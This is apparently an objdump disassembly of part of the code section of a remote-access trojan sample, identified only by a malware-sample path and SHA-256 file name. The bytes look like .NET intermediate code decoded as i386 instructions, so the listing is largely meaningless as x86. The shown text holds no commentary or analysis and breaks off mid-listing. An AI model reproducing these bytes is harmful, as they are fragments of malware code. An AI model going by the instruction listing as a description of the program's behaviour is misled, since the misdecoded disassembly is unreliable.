
malware_samples/rat/940e18e109ff6af1d6c8ab01f00746034ae67dd62c49a2353931b91ef36f4e0d.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	b0 8c                	mov    $0x8c,%al
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 bc 46 00    	add    %al,0x46bc00
  402013:	00 b8 45 00 00 03    	add    %bh,0x3000045(%eax)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 55 00             	add    %dl,0x0(%ebp)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1e                   	push   %ds
  402051:	02 28                	add    (%eax),%ch
  402053:	01 00                	add    %eax,(%eax)
  402055:	00 0a                	add    %cl,(%edx)
  402057:	2a 1e                	sub    (%esi),%bl
  402059:	02 28                	add    (%eax),%ch
  40205b:	04 00                	add    $0x0,%al
  40205d:	00 0a                	add    %cl,(%edx)
  40205f:	2a a6 73 06 00 00    	sub    0x673(%esi),%ah
  402065:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  40206b:	73 07                	jae    0x402074
  40206d:	00 00                	add    %al,(%eax)
  40206f:	0a 80 02 00 00 04    	or     0x4000002(%eax),%al
  402075:	73 08                	jae    0x40207f
  402077:	00 00                	add    %al,(%eax)
  402079:	0a 80 03 00 00 04    	or     0x4000003(%eax),%al
  40207f:	73 09                	jae    0x40208a
  402081:	00 00                	add    %al,(%eax)
  402083:	0a 80 04 00 00 04    	or     0x4000004(%eax),%al
  402089:	2a 2e                	sub    (%esi),%ch
  40208b:	7e 01                	jle    0x40208e
  40208d:	00 00                	add    %al,(%eax)
  40208f:	04 6f                	add    $0x6f,%al
  402091:	0a 00                	or     (%eax),%al
  402093:	00 0a                	add    %cl,(%edx)
  402095:	2a 2e                	sub    (%esi),%ch
  402097:	7e 02                	jle    0x40209b
  402099:	00 00                	add    %al,(%eax)
  40209b:	04 6f                	add    $0x6f,%al
  40209d:	0b 00                	or     (%eax),%eax
  40209f:	00 0a                	add    %cl,(%edx)
  4020a1:	2a 2e                	sub    (%esi),%ch
  4020a3:	7e 03                	jle    0x4020a8
  4020a5:	00 00                	add    %al,(%eax)
  4020a7:	04 6f                	add    $0x6f,%al
  4020a9:	0c 00                	or     $0x0,%al
  4020ab:	00 0a                	add    %cl,(%edx)
  4020ad:	2a 2e                	sub    (%esi),%ch
  4020af:	7e 04                	jle    0x4020b5
  4020b1:	00 00                	add    %al,(%eax)
  4020b3:	04 6f                	add    $0x6f,%al
  4020b5:	0d 00 00 0a 2a       	or     $0x2a0a0000,%eax
  4020ba:	36 02 03             	add    %ss:(%ebx),%al
  4020bd:	28 11                	sub    %dl,(%ecx)
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	0a 28                	or     (%eax),%ch
  4020c3:	12 00                	adc    (%eax),%al
  4020c5:	00 0a                	add    %cl,(%edx)
  4020c7:	2a 1e                	sub    (%esi),%bl
  4020c9:	02 28                	add    (%eax),%ch
  4020cb:	13 00                	adc    (%eax),%eax
  4020cd:	00 0a                	add    %cl,(%edx)
  4020cf:	2a 2e                	sub    (%esi),%ch
  4020d1:	d0 05 00 00 02 28    	rolb   $1,0x28020000
  4020d7:	14 00                	adc    $0x0,%al
  4020d9:	00 0a                	add    %cl,(%edx)
  4020db:	2a 1e                	sub    (%esi),%bl
  4020dd:	02 28                	add    (%eax),%ch
  4020df:	15 00 00 0a 2a       	adc    $0x2a0a0000,%eax
  4020e4:	13 30                	adc    (%eax),%esi
  4020e6:	01 00                	add    %eax,(%eax)
  4020e8:	14 00                	adc    $0x0,%al
  4020ea:	00 00                	add    %al,(%eax)
  4020ec:	01 00                	add    %eax,(%eax)
  4020ee:	00 11                	add    %dl,(%ecx)
  4020f0:	02 8c 05 00 00 1b 2d 	add    0x2d1b0000(%ebp,%eax,1),%cl
  4020f7:	08 28                	or     %ch,(%eax)
  4020f9:	01 00                	add    %eax,(%eax)
  4020fb:	00 2b                	add    %ch,(%ebx)
  4020fd:	0a 2b                	or     (%ebx),%ch
  4020ff:	02 02                	add    (%edx),%al
  402101:	0a 06                	or     (%esi),%al
  402103:	2a 22                	sub    (%edx),%ah
  402105:	03 fe                	add    %esi,%edi
  402107:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  40210c:	2a 1e                	sub    (%esi),%bl
  40210e:	02 28                	add    (%eax),%ch
  402110:	17                   	pop    %ss
  402111:	00 00                	add    %al,(%eax)
  402113:	0a 2a                	or     (%edx),%ch
  402115:	72 7e                	jb     0x402195
  402117:	1b 00                	sbb    (%eax),%eax
  402119:	00 0a                	add    %cl,(%edx)
  40211b:	8c 07                	mov    %es,(%edi)
  40211d:	00 00                	add    %al,(%eax)
  40211f:	1b 2d 0a 28 02 00    	sbb    0x2280a,%ebp
  402125:	00 2b                	add    %ch,(%ebx)
  402127:	80 1b 00             	sbbb   $0x0,(%ebx)
  40212a:	00 0a                	add    %cl,(%edx)
  40212c:	7e 1b                	jle    0x402149
  40212e:	00 00                	add    %al,(%eax)
  402130:	0a 2a                	or     (%edx),%ch
  402132:	1e                   	push   %ds
  402133:	02 1b                	add    (%ebx),%bl
  402135:	30 04 00             	xor    %al,(%eax,%eax,1)
  402138:	f5                   	cmc
  402139:	00 00                	add    %al,(%eax)
  40213b:	00 02                	add    %al,(%edx)
  40213d:	00 00                	add    %al,(%eax)
  40213f:	11 7e 1d             	adc    %edi,0x1d(%esi)
  402142:	00 00                	add    %al,(%eax)
  402144:	0a 72 01             	or     0x1(%edx),%dh
  402147:	00 00                	add    %al,(%eax)
  402149:	70 28                	jo     0x402173
  40214b:	1e                   	push   %ds
  40214c:	00 00                	add    %al,(%eax)
  40214e:	0a 28                	or     (%eax),%ch
  402150:	15 00 00 06 6f       	adc    $0x6f060000,%eax
  402155:	1f                   	pop    %ds
  402156:	00 00                	add    %al,(%eax)
  402158:	0a 72 7b             	or     0x7b(%edx),%dh
  40215b:	00 00                	add    %al,(%eax)
  40215d:	70 72                	jo     0x4021d1
  40215f:	7f 00                	jg     0x402161
  402161:	00 70 6f             	add    %dh,0x6f(%eax)
  402164:	20 00                	and    %al,(%eax)
  402166:	00 0a                	add    %cl,(%edx)
  402168:	28 11                	sub    %dl,(%ecx)
  40216a:	00 00                	add    %al,(%eax)
  40216c:	0a 0a                	or     (%edx),%cl
  40216e:	06                   	push   %es
  40216f:	6f                   	outsl  %ds:(%esi),(%dx)
  402170:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402175:	21 00                	and    %eax,(%eax)
  402177:	00 0a                	add    %cl,(%edx)
  402179:	72 81                	jb     0x4020fc
  40217b:	00 00                	add    %al,(%eax)
  40217d:	70 6f                	jo     0x4021ee
  40217f:	22 00                	and    (%eax),%al
  402181:	00 0a                	add    %cl,(%edx)
  402183:	2d 6e 06 6f 15       	sub    $0x156f066e,%eax
  402188:	00 00                	add    %al,(%eax)
  40218a:	0a 6f 21             	or     0x21(%edi),%ch
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 72 8f             	or     -0x71(%edx),%dh
  402192:	00 00                	add    %al,(%eax)
  402194:	70 6f                	jo     0x402205
  402196:	22 00                	and    (%eax),%al
  402198:	00 0a                	add    %cl,(%edx)
  40219a:	2d 57 28 22 00       	sub    $0x222857,%eax
  40219f:	00 06                	add    %al,(%esi)
  4021a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4021a2:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  4021a7:	21 00                	and    %eax,(%eax)
  4021a9:	00 0a                	add    %cl,(%edx)
  4021ab:	72 99                	jb     0x402146
  4021ad:	00 00                	add    %al,(%eax)
  4021af:	70 28                	jo     0x4021d9
  4021b1:	21 00                	and    %eax,(%eax)
  4021b3:	00 0a                	add    %cl,(%edx)
  4021b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4021b6:	22 00                	and    (%eax),%al
  4021b8:	00 0a                	add    %cl,(%edx)
  4021ba:	2d 37 72 9f 00       	sub    $0x9f7237,%eax
  4021bf:	00 70 28             	add    %dh,0x28(%eax)
  4021c2:	12 00                	adc    (%eax),%al
  4021c4:	00 06                	add    %al,(%esi)
  4021c6:	2d 2b 28 23 00       	sub    $0x23282b,%eax
  4021cb:	00 0a                	add    %cl,(%edx)
  4021cd:	2d 24 28 24 00       	sub    $0x242824,%eax
  4021d2:	00 0a                	add    %cl,(%edx)
  4021d4:	2d 1d 72 b7 00       	sub    $0xb7721d,%eax
  4021d9:	00 70 28             	add    %dh,0x28(%eax)
  4021dc:	25 00 00 0a 72       	and    $0x720a0000,%eax
  4021e1:	c5 00                	lds    (%eax),%eax
  4021e3:	00 70 28             	add    %dh,0x28(%eax)
  4021e6:	26 00 00             	add    %al,%es:(%eax)
  4021e9:	0a 28                	or     (%eax),%ch
  4021eb:	27                   	daa
  4021ec:	00 00                	add    %al,(%eax)
  4021ee:	0a 2d 02 de 41 72    	or     0x7241de02,%ch
  4021f4:	e1 00                	loope  0x4021f6
  4021f6:	00 70 28             	add    %dh,0x28(%eax)
  4021f9:	1e                   	push   %ds
  4021fa:	00 00                	add    %al,(%eax)
  4021fc:	0a 28                	or     (%eax),%ch
  4021fe:	15 00 00 06 72       	adc    $0x72060000,%eax
  402203:	33 01                	xor    (%ecx),%eax
  402205:	00 70 28             	add    %dh,0x28(%eax)
  402208:	28 00                	sub    %al,(%eax)
  40220a:	00 0a                	add    %cl,(%edx)
  40220c:	72 33                	jb     0x402241
  40220e:	01 00                	add    %eax,(%eax)
  402210:	70 28                	jo     0x40223a
  402212:	29 00                	sub    %eax,(%eax)
  402214:	00 0a                	add    %cl,(%edx)
  402216:	16                   	push   %ss
  402217:	16                   	push   %ss
  402218:	15 28 2a 00 00       	adc    $0x2a28,%eax
  40221d:	0a 26                	or     (%esi),%ah
  40221f:	28 2b                	sub    %ch,(%ebx)
  402221:	00 00                	add    %al,(%eax)
  402223:	0a de                	or     %dh,%bl
  402225:	0e                   	push   %cs
  402226:	25 28 2c 00 00       	and    $0x2c28,%eax
  40222b:	0a 0b                	or     (%ebx),%cl
  40222d:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  402233:	00 2a                	add    %ch,(%edx)
  402235:	00 00                	add    %al,(%eax)
  402237:	00 01                	add    %al,(%ecx)
  402239:	10 00                	adc    %al,(%eax)
  40223b:	00 00                	add    %al,(%eax)
  40223d:	00 00                	add    %al,(%eax)
  40223f:	00 e6                	add    %ah,%dh
  402241:	e6 00                	out    %al,$0x0
  402243:	0e                   	push   %cs
  402244:	14 00                	adc    $0x0,%al
  402246:	00 01                	add    %al,(%ecx)
  402248:	32 28                	xor    (%eax),%ch
  40224a:	2e 00 00             	add    %al,%cs:(%eax)
  40224d:	0a 02                	or     (%edx),%al
  40224f:	6f                   	outsl  %ds:(%esi),(%dx)
  402250:	2f                   	das
  402251:	00 00                	add    %al,(%eax)
  402253:	0a 2a                	or     (%edx),%ch
  402255:	32 28                	xor    (%eax),%ch
  402257:	2e 00 00             	add    %al,%cs:(%eax)
  40225a:	0a 02                	or     (%edx),%al
  40225c:	6f                   	outsl  %ds:(%esi),(%dx)
  40225d:	30 00                	xor    %al,(%eax)
  40225f:	00 0a                	add    %cl,(%edx)
  402261:	2a 00                	sub    (%eax),%al
  402263:	00 1b                	add    %bl,(%ebx)
  402265:	30 03                	xor    %al,(%ebx)
  402267:	00 31                	add    %dh,(%ecx)
  402269:	00 00                	add    %al,(%eax)
  40226b:	00 02                	add    %al,(%edx)
  40226d:	00 00                	add    %al,(%eax)
  40226f:	11 7e 31             	adc    %edi,0x31(%esi)
  402272:	00 00                	add    %al,(%eax)
  402274:	0a 72 37             	or     0x37(%edx),%dh
  402277:	01 00                	add    %eax,(%eax)
  402279:	70 28                	jo     0x4022a3
  40227b:	25 00 00 06 28       	and    $0x28060000,%eax
  402280:	26 00 00             	add    %al,%es:(%eax)
  402283:	0a 6f 1f             	or     0x1f(%edi),%ch
  402286:	00 00                	add    %al,(%eax)
  402288:	0a 02                	or     (%edx),%al
  40228a:	6f                   	outsl  %ds:(%esi),(%dx)
  40228b:	32 00                	xor    (%eax),%al
  40228d:	00 0a                	add    %cl,(%edx)
  40228f:	de 0e                	fimuls (%esi)
  402291:	25 28 2c 00 00       	and    $0x2c28,%eax
  402296:	0a 0b                	or     (%ebx),%cl
  402298:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40229e:	00 06                	add    %al,(%esi)
  4022a0:	2a 00                	sub    (%eax),%al
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	01 10                	add    %edx,(%eax)
  4022a6:	00 00                	add    %al,(%eax)
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	00 00                	add    %al,(%eax)
  4022ac:	21 21                	and    %esp,(%ecx)
  4022ae:	00 0e                	add    %cl,(%esi)
  4022b0:	14 00                	adc    $0x0,%al
  4022b2:	00 01                	add    %al,(%ecx)
  4022b4:	1b 30                	sbb    (%eax),%esi
  4022b6:	03 00                	add    (%eax),%eax
  4022b8:	3e 00 00             	add    %al,%ds:(%eax)
  4022bb:	00 03                	add    %al,(%ebx)
  4022bd:	00 00                	add    %al,(%eax)
  4022bf:	11 7e 31             	adc    %edi,0x31(%esi)
  4022c2:	00 00                	add    %al,(%eax)
  4022c4:	0a 72 37             	or     0x37(%edx),%dh
  4022c7:	01 00                	add    %eax,(%eax)
  4022c9:	70 28                	jo     0x4022f3
  4022cb:	25 00 00 06 28       	and    $0x28060000,%eax
  4022d0:	26 00 00             	add    %al,%es:(%eax)
  4022d3:	0a 6f 1f             	or     0x1f(%edi),%ch
  4022d6:	00 00                	add    %al,(%eax)
  4022d8:	0a 02                	or     (%edx),%al
  4022da:	72 7f                	jb     0x40235b
  4022dc:	00 00                	add    %al,(%eax)
  4022de:	70 6f                	jo     0x40234f
  4022e0:	20 00                	and    %al,(%eax)
  4022e2:	00 0a                	add    %cl,(%edx)
  4022e4:	28 33                	sub    %dh,(%ebx)
  4022e6:	00 00                	add    %al,(%eax)
  4022e8:	0a 0a                	or     (%edx),%cl
  4022ea:	de 10                	ficoms (%eax)
  4022ec:	25 28 2c 00 00       	and    $0x2c28,%eax
  4022f1:	0a 0b                	or     (%ebx),%cl
  4022f3:	14 0a                	adc    $0xa,%al
  4022f5:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4022fb:	00 06                	add    %al,(%esi)
  4022fd:	2a 00                	sub    (%eax),%al
  4022ff:	00 01                	add    %al,(%ecx)
  402301:	10 00                	adc    %al,(%eax)
  402303:	00 00                	add    %al,(%eax)
  402305:	00 00                	add    %al,(%eax)
  402307:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  40230a:	00 10                	add    %dl,(%eax)
  40230c:	14 00                	adc    $0x0,%al
  40230e:	00 01                	add    %al,(%ecx)
  402310:	1b 30                	sbb    (%eax),%esi
  402312:	03 00                	add    (%eax),%eax
  402314:	40                   	inc    %eax
  402315:	00 00                	add    %al,(%eax)
  402317:	00 02                	add    %al,(%edx)
  402319:	00 00                	add    %al,(%eax)
  40231b:	11 7e 31             	adc    %edi,0x31(%esi)
  40231e:	00 00                	add    %al,(%eax)
  402320:	0a 72 37             	or     0x37(%edx),%dh
  402323:	01 00                	add    %eax,(%eax)
  402325:	70 28                	jo     0x40234f
  402327:	25 00 00 06 28       	and    $0x28060000,%eax
  40232c:	26 00 00             	add    %al,%es:(%eax)
  40232f:	0a 6f 1f             	or     0x1f(%edi),%ch
  402332:	00 00                	add    %al,(%eax)
  402334:	0a 02                	or     (%edx),%al
  402336:	03 6f 34             	add    0x34(%edi),%ebp
  402339:	00 00                	add    %al,(%eax)
  40233b:	0a 17                	or     (%edi),%dl
  40233d:	8c 22                	mov    %fs,(%edx)
  40233f:	00 00                	add    %al,(%eax)
  402341:	01 0a                	add    %ecx,(%edx)
  402343:	de 15 25 28 2c 00    	ficoms 0x2c2825
  402349:	00 0a                	add    %cl,(%edx)
  40234b:	0b 16                	or     (%esi),%edx
  40234d:	8c 22                	mov    %fs,(%edx)
  40234f:	00 00                	add    %al,(%eax)
  402351:	01 0a                	add    %ecx,(%edx)
  402353:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  402359:	00 06                	add    %al,(%esi)
  40235b:	2a 01                	sub    (%ecx),%al
  40235d:	10 00                	adc    %al,(%eax)
  40235f:	00 00                	add    %al,(%eax)
  402361:	00 00                	add    %al,(%eax)
  402363:	00 29                	add    %ch,(%ecx)
  402365:	29 00                	sub    %eax,(%eax)
  402367:	15 14 00 00 01       	adc    $0x1000014,%eax
  40236c:	13 30                	adc    (%eax),%esi
  40236e:	07                   	pop    %es
  40236f:	00 83 00 00 00 04    	add    %al,0x4000000(%ebx)
  402375:	00 00                	add    %al,(%eax)
  402377:	11 73 35             	adc    %esi,0x35(%ebx)
  40237a:	00 00                	add    %al,(%eax)
  40237c:	0a 73 36             	or     0x36(%ebx),%dh
  40237f:	00 00                	add    %al,(%eax)
  402381:	0a 0a                	or     (%edx),%cl
  402383:	73 36                	jae    0x4023bb
  402385:	00 00                	add    %al,(%eax)
  402387:	0a 0b                	or     (%ebx),%cl
  402389:	02 28                	add    (%eax),%ch
  40238b:	15 00 00 06 03       	adc    $0x3060000,%eax
  402390:	15 16 28 37 00       	adc    $0x372816,%eax
  402395:	00 0a                	add    %cl,(%edx)
  402397:	0c 06                	or     $0x6,%al
  402399:	02 16                	add    (%esi),%dl
  40239b:	08 16                	or     %dl,(%esi)
  40239d:	9a 6f 38 00 00 0a 6f 	lcall  $0x6f0a,$0x386f
  4023a4:	39 00                	cmp    %eax,(%eax)
  4023a6:	00 0a                	add    %cl,(%edx)
  4023a8:	07                   	pop    %es
  4023a9:	02 08                	add    (%eax),%cl
  4023ab:	16                   	push   %ss
  4023ac:	9a 6f 38 00 00 0a 03 	lcall  $0x30a,$0x386f
  4023b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023b4:	38 00                	cmp    %al,(%eax)
  4023b6:	00 0a                	add    %cl,(%edx)
  4023b8:	d6                   	salc
  4023b9:	02 8e 69 08 16 9a    	add    -0x65e9f797(%esi),%cl
  4023bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4023c0:	38 00                	cmp    %al,(%eax)
  4023c2:	00 0a                	add    %cl,(%edx)
  4023c4:	03 6f 38             	add    0x38(%edi),%ebp
  4023c7:	00 00                	add    %al,(%eax)
  4023c9:	0a d6                	or     %dh,%dl
  4023cb:	da 6f 39             	fisubrl 0x39(%edi)
  4023ce:	00 00                	add    %al,(%eax)
  4023d0:	0a 25 06 6f 3a 00    	or     0x3a6f06,%ah
  4023d6:	00 0a                	add    %cl,(%edx)
  4023d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d9:	3b 00                	cmp    (%eax),%eax
  4023db:	00 0a                	add    %cl,(%edx)
  4023dd:	25 07 6f 3a 00       	and    $0x3a6f07,%eax
  4023e2:	00 0a                	add    %cl,(%edx)
  4023e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4023e5:	3b 00                	cmp    (%eax),%eax
  4023e7:	00 0a                	add    %cl,(%edx)
  4023e9:	06                   	push   %es
  4023ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4023eb:	3c 00                	cmp    $0x0,%al
  4023ed:	00 0a                	add    %cl,(%edx)
  4023ef:	07                   	pop    %es
  4023f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f1:	3c 00                	cmp    $0x0,%al
  4023f3:	00 0a                	add    %cl,(%edx)
  4023f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f6:	3d 00 00 0a 2a       	cmp    $0x2a0a0000,%eax
  4023fb:	7a 03                	jp     0x402400
  4023fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4023fe:	3e 00 00             	add    %al,%ds:(%eax)
  402401:	0a 17                	or     (%edi),%dl
  402403:	33 06                	xor    (%esi),%eax
  402405:	28 39                	sub    %bh,(%ecx)
  402407:	00 00                	add    %al,(%eax)
  402409:	06                   	push   %es
  40240a:	2a 03                	sub    (%ebx),%al
  40240c:	6f                   	outsl  %ds:(%esi),(%dx)
  40240d:	3e 00 00             	add    %al,%ds:(%eax)
  402410:	0a 18                	or     (%eax),%bl
  402412:	33 05 28 39 00 00    	xor    0x3928,%eax
  402418:	06                   	push   %es
  402419:	2a 00                	sub    (%eax),%al
  40241b:	00 1b                	add    %bl,(%ebx)
  40241d:	30 05 00 ec 00 00    	xor    %al,0xec00
  402423:	00 05 00 00 11 03    	add    %al,0x3110000
  402429:	47                   	inc    %edi
  40242a:	2c 60                	sub    $0x60,%al
  40242c:	14 0b                	adc    $0xb,%al
  40242e:	73 36                	jae    0x402466
  402430:	00 00                	add    %al,(%eax)
  402432:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402435:	17                   	pop    %ss
  402436:	17                   	pop    %ss
  402437:	73 3f                	jae    0x402478
  402439:	00 00                	add    %al,(%eax)
  40243b:	0a 25 02 16 02 8e    	or     0x8e021602,%ah
  402441:	69 6f 40 00 00 0a 6f 	imul   $0x6f0a0000,0x40(%edi),%ebp
  402448:	3c 00                	cmp    $0x0,%al
  40244a:	00 0a                	add    %cl,(%edx)
  40244c:	08 16                	or     %dl,(%esi)
  40244e:	6a 6f                	push   $0x6f
  402450:	41                   	inc    %ecx
  402451:	00 00                	add    %al,(%eax)
  402453:	0a 08                	or     (%eax),%cl
  402455:	6f                   	outsl  %ds:(%esi),(%dx)
  402456:	42                   	inc    %edx
  402457:	00 00                	add    %al,(%eax)
  402459:	0a b7 17 d6 17 da    	or     -0x25e829e9(%edi),%dh
  40245f:	17                   	pop    %ss
  402460:	d6                   	salc
  402461:	8d 2d 00 00 01 0b    	lea    0xb010000,%ebp
  402467:	08 07                	or     %al,(%edi)
  402469:	16                   	push   %ss
  40246a:	07                   	pop    %es
  40246b:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40246e:	43                   	inc    %ebx
  40246f:	00 00                	add    %al,(%eax)
  402471:	0a 26                	or     (%esi),%ah
  402473:	08 6f 3c             	or     %ch,0x3c(%edi)
  402476:	00 00                	add    %al,(%eax)
  402478:	0a de                	or     %dh,%bl
  40247a:	0a 08                	or     (%eax),%cl
  40247c:	2c 06                	sub    $0x6,%al
  40247e:	08 6f 44             	or     %ch,0x44(%edi)
  402481:	00 00                	add    %al,(%eax)
  402483:	0a dc                	or     %ah,%bl
  402485:	07                   	pop    %es
  402486:	0a 38                	or     (%eax),%bh
  402488:	86 00                	xchg   %al,(%eax)
  40248a:	00 00                	add    %al,(%eax)
  40248c:	14 0d                	adc    $0xd,%al
  40248e:	02 73 45             	add    0x45(%ebx),%dh
  402491:	00 00                	add    %al,(%eax)
  402493:	0a 13                	or     (%ebx),%dl
  402495:	04 11                	add    $0x11,%al
  402497:	04 16                	add    $0x16,%al
  402499:	73 46                	jae    0x4024e1
  40249b:	00 00                	add    %al,(%eax)
  40249d:	0a 13                	or     (%ebx),%dl
  40249f:	05 1a 8d 2d 00       	add    $0x2d8d1a,%eax
  4024a4:	00 01                	add    %al,(%ecx)
  4024a6:	13 06                	adc    (%esi),%eax
  4024a8:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  4024ab:	04 6f                	add    $0x6f,%al
  4024ad:	42                   	inc    %edx
  4024ae:	00 00                	add    %al,(%eax)
  4024b0:	0a 1b                	or     (%ebx),%bl
  4024b2:	6a da                	push   $0xffffffda
  4024b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4024b5:	41                   	inc    %ecx
  4024b6:	00 00                	add    %al,(%eax)
  4024b8:	0a 11                	or     (%ecx),%dl
  4024ba:	04 11                	add    $0x11,%al
  4024bc:	06                   	push   %es
  4024bd:	16                   	push   %ss
  4024be:	1a 6f 43             	sbb    0x43(%edi),%ch
  4024c1:	00 00                	add    %al,(%eax)
  4024c3:	0a 26                	or     (%esi),%ah
  4024c5:	11 06                	adc    %eax,(%esi)
  4024c7:	16                   	push   %ss
  4024c8:	28 47 00             	sub    %al,0x0(%edi)
  4024cb:	00 0a                	add    %cl,(%edx)
  4024cd:	13 07                	adc    (%edi),%eax
  4024cf:	11 04 16             	adc    %eax,(%esi,%edx,1)
  4024d2:	6a 6f                	push   $0x6f
  4024d4:	41                   	inc    %ecx
  4024d5:	00 00                	add    %al,(%eax)
  4024d7:	0a 11                	or     (%ecx),%dl
  4024d9:	07                   	pop    %es
  4024da:	17                   	pop    %ss
  4024db:	da 17                	ficoml (%edi)
  4024dd:	d6                   	salc
  4024de:	17                   	pop    %ss
  4024df:	da 17                	ficoml (%edi)
  4024e1:	d6                   	salc
  4024e2:	8d 2d 00 00 01 0d    	lea    0xd010000,%ebp
  4024e8:	11 05 09 16 11 07    	adc    %eax,0x7111609
  4024ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4024ef:	48                   	dec    %eax
  4024f0:	00 00                	add    %al,(%eax)
  4024f2:	0a 26                	or     (%esi),%ah
  4024f4:	11 05 6f 3c 00 00    	adc    %eax,0x3c6f
  4024fa:	0a 11                	or     (%ecx),%dl
  4024fc:	04 6f                	add    $0x6f,%al
  4024fe:	3c 00                	cmp    $0x0,%al
  402500:	00 0a                	add    %cl,(%edx)
  402502:	de 0c 11             	fimuls (%ecx,%edx,1)
  402505:	04 2c                	add    $0x2c,%al
  402507:	07                   	pop    %es
  402508:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  40250b:	44                   	inc    %esp
  40250c:	00 00                	add    %al,(%eax)
  40250e:	0a dc                	or     %ah,%bl
  402510:	09 0a                	or     %ecx,(%edx)
  402512:	06                   	push   %es
  402513:	2a 01                	sub    (%ecx),%al
  402515:	1c 00                	sbb    $0x0,%al
  402517:	00 02                	add    %al,(%edx)
  402519:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40251c:	47                   	inc    %edi
  40251d:	53                   	push   %ebx
  40251e:	00 0a                	add    %cl,(%edx)
  402520:	00 00                	add    %al,(%eax)
  402522:	00 00                	add    %al,(%eax)
  402524:	02 00                	add    (%eax),%al
  402526:	6e                   	outsb  %ds:(%esi),(%dx)
  402527:	00 6e dc             	add    %ch,-0x24(%esi)
  40252a:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40252d:	00 00                	add    %al,(%eax)
  40252f:	00 0b                	add    %cl,(%ebx)
  402531:	30 02                	xor    %al,(%edx)
  402533:	00 20                	add    %ah,(%eax)
  402535:	00 00                	add    %al,(%eax)
  402537:	00 00                	add    %al,(%eax)
  402539:	00 00                	add    %al,(%eax)
  40253b:	00 02                	add    %al,(%edx)
  40253d:	72 4b                	jb     0x40258a
  40253f:	01 00                	add    %eax,(%eax)
  402541:	70 28                	jo     0x40256b
  402543:	26 00 00             	add    %al,%es:(%eax)
  402546:	0a 28                	or     (%eax),%ch
  402548:	1c 00                	sbb    $0x0,%al
  40254a:	00 06                	add    %al,(%esi)
  40254c:	26 de 0c 28          	fimuls %es:(%eax,%ebp,1)
  402550:	2c 00                	sub    $0x0,%al
  402552:	00 0a                	add    %cl,(%edx)
  402554:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40255a:	00 2a                	add    %ch,(%edx)
  40255c:	01 10                	add    %edx,(%eax)
  40255e:	00 00                	add    %al,(%eax)
  402560:	00 00                	add    %al,(%eax)
  402562:	00 00                	add    %al,(%eax)
  402564:	13 13                	adc    (%ebx),%edx
  402566:	00 0c 14             	add    %cl,(%esp,%edx,1)
  402569:	00 00                	add    %al,(%eax)
  40256b:	01 2e                	add    %ebp,(%esi)
  40256d:	7e 0d                	jle    0x40257c
  40256f:	00 00                	add    %al,(%eax)
  402571:	04 80                	add    $0x80,%al
  402573:	06                   	push   %es
  402574:	00 00                	add    %al,(%eax)
  402576:	04 2a                	add    $0x2a,%al
  402578:	1b 30                	sbb    (%eax),%esi
  40257a:	02 00                	add    (%eax),%al
  40257c:	32 00                	xor    (%eax),%al
  40257e:	00 00                	add    %al,(%eax)
  402580:	02 00                	add    (%eax),%al
  402582:	00 11                	add    %dl,(%ecx)
  402584:	28 21                	sub    %ah,(%ecx)
  402586:	00 00                	add    %al,(%eax)
  402588:	06                   	push   %es
  402589:	72 6d                	jb     0x4025f8
  40258b:	01 00                	add    %eax,(%eax)
  40258d:	70 28                	jo     0x4025b7
  40258f:	49                   	dec    %ecx
  402590:	00 00                	add    %al,(%eax)
  402592:	0a 28                	or     (%eax),%ch
  402594:	25 00 00 06 28       	and    $0x28060000,%eax
  402599:	49                   	dec    %ecx
  40259a:	00 00                	add    %al,(%eax)
  40259c:	0a 0a                	or     (%edx),%cl
  40259e:	de 14 25 28 2c 00 00 	ficoms 0x2c28(,%eiz,1)
  4025a5:	0a 0b                	or     (%ebx),%cl
  4025a7:	72 71                	jb     0x40261a
  4025a9:	01 00                	add    %eax,(%eax)
  4025ab:	70 0a                	jo     0x4025b7
  4025ad:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4025b3:	00 06                	add    %al,(%esi)
  4025b5:	2a 00                	sub    (%eax),%al
  4025b7:	00 01                	add    %al,(%ecx)
  4025b9:	10 00                	adc    %al,(%eax)
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	00 00                	add    %al,(%eax)
  4025bf:	00 1c 1c             	add    %bl,(%esp,%ebx,1)
  4025c2:	00 14 14             	add    %dl,(%esp,%edx,1)
  4025c5:	00 00                	add    %al,(%eax)
  4025c7:	01 1b                	add    %ebx,(%ebx)
  4025c9:	30 02                	xor    %al,(%edx)
  4025cb:	00 1e                	add    %bl,(%esi)
  4025cd:	00 00                	add    %al,(%eax)
  4025cf:	00 02                	add    %al,(%edx)
